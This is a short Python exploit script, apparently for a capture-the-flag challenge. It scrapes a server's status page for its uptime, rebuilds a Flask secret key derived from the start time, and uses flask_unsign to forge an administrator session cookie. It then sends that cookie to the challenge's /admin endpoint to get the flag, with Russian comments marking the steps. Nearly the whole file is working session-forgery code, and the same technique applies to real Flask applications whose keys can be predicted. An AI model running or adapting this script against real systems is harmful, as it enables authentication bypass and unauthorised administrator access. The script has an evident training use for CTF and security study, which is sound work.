import uuid
import requests
import re
from datetime import datetime, timedelta
import hashlib
import time
from flask_unsign import decode, sign

secret = uuid.UUID('31333337-1337-1337-1337-133713371337')
print(uuid.uuid5(secret, 'administrator'))
status_url = 'http://chal.competitivecyber.club:9999/status'
admin_url ='http://chal.competitivecyber.club:9999/admin'
response = requests.get(status_url)
status_content = response.text
print(status_content)

current_time_str = re.search(r'Server time: ([\d\- :]+)', status_content).group(1)
uptime_str = re.search(r'Server uptime: ([\d:]+)', status_content).group(1)
current_time = datetime.strptime(current_time_str, '%Y-%m-%d %H:%M:%S')
uptime_parts = list(map(int, uptime_str.split(":")))
server_uptime = timedelta(hours=uptime_parts[0], minutes=uptime_parts[1], seconds=uptime_parts[2])

server_start_time = current_time - server_uptime
server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')

secret_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
# Много принтов для отладки
print(current_time)
print(server_uptime)
print(server_start_str)
cookie_value="eyJ1aWQiOiIwOWE4MDJmNS1lMDNkLTUyZjgtOGJhMC01YTRmOTlkMWIzYjIiLCJ1c2VybmFtZSI6IjEyMzExMiJ9.ZvJkjQ.5rawci2zoyVDHcJxGcF_upgO-3o"
decoded_session = decode(cookie_value)
print(decoded_session)
session_data={'uid': secret, 'username': 'administrator', 'is_admin': True}
signed_cookie = sign(session_data, secret_key)

print(signed_cookie)

text = requests.get(admin_url, cookies={"session": signed_cookie}).text # Получаем флаг
print(text) # Выводим флаг
decoded_session = decode(signed_cookie)
print(decoded_session)
